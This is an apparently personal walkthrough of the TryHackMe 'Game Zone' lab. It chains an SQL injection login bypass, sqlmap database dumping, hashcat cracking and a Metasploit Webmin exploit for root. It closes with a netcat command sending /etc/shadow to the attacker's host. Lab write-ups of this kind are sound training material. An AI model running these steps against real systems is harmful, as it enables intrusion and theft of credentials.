*2021-08-29*

*kimm3*

# Walkthrough: Game Zone
Platform: TryHackMe

Difficulty: Easy

- [Link](https://tryhackme.com/room/gamezone)

As this is a room on TryHackMe I don't explore every single possibility, I awnser the questions and move on. I won't post any awnsers to questions here, or even refer to them - just showing how to hack the box, as intended.
## Setup
![ll](assets/markdown-img-paste-20210826112245589.png)

```
script history/enum1
export IP=10.10.10.58
ping $IP
```
## Scans and enumeration
`sudo nmap $IP -p- -Pn -A -oA scans/nmap-init`

![nmap-init](assets/markdown-img-paste-2021082911471756.png)

![indexp80](assets/markdown-img-paste-20210829114612232.png)

Index at port 80.

## Checking for SQLi vulnerabilities
### SQLi login
Using `' or 1=1 -- -` in both username and password field, works and redirects us to the 'portal.php' page.

![success-portal](assets/markdown-img-paste-20210829115339916.png)

### sqlmap on portal page
From here we can try for more sqli vulnerabilities with sqlmap. Copy the request made form a serch in the 'portal.php'(I copied headers and data from firefox).

`sqlmap -r research/requestportal.txt | tee scans/sqlmap-portal`

![sqlm-init](assets/markdown-img-paste-20210829120410558.png)

`sqlmap -r research/requestportal.txt --is-dba --dbs --hostname | tee scans/sqlmap-portal-dbenum`

![sqlm-db](assets/markdown-img-paste-20210829120433842.png)

`sqlmap -r research/requestportal.txt -D db --dump | tee scans/sqlmap-portal-db-dump`

![db-dump](assets/markdown-img-paste-20210829120712573.png)

### Cracking the pass
```
hashid creds/agent47hash
hashcat -a 0 -m 1400 creds/agent47hash sl/Passwords/Leaked-Databases/rockyou.txt
```

![cracked](assets/markdown-img-paste-20210829121212259.png)
## Foothold
SSH with the user and cracked password works.

![ssh-login](assets/markdown-img-paste-20210829121335301.png)

![usertxt](assets/markdown-img-paste-20210829121438703.png)

![sstulpn](assets/markdown-img-paste-20210829121802328.png)

The TCP 10000 didn't show up on the nmap scan, might be blocked form access outside. Use SSH port forwarding to make it visible to our local machine.

`ssh -L 10000:localhost:10000 agent47@10.10.10.58`

This exposes a webmin login page.
![webmin](assets/markdown-img-paste-20210829122531432.png)

![webmin-about](assets/markdown-img-paste-20210829122541197.png)

We can now scan the port with nmap, pointing it to our local machine port 10000.

`sudo nmap localhost -p 10000 -sC -sV -Pn -n -oA scans/nmap-p10000`

![nmap-webmin](assets/markdown-img-paste-20210829122757598.png)

![rce-webmin](assets/markdown-img-paste-20210829122901568.png)

A msf RCE module exists for this version.

![webmin-login](assets/markdown-img-paste-20210829123152674.png)

The agent47 and password works to login.

![descr-cve](assets/markdown-img-paste-20210829123216887.png)
## Privilege Escalation
```
script history/target3
msfconsole
search 2012-2982
use 0
info
set USERNAME agent47
set PASSWORD videogamer124
set RHOSTS localhost
set LHOST 10.8.210.115
show payloads
set payload 5
```

Played around with differend payloads, number 5(reverse unix) worked.

![roottxt](assets/markdown-img-paste-20210829124808766.png)
## Post Exploitation
Downloading the shadow file with password hashes.

```
nc -w 3 10.8.210.115 4243 < /etc/shadow
```
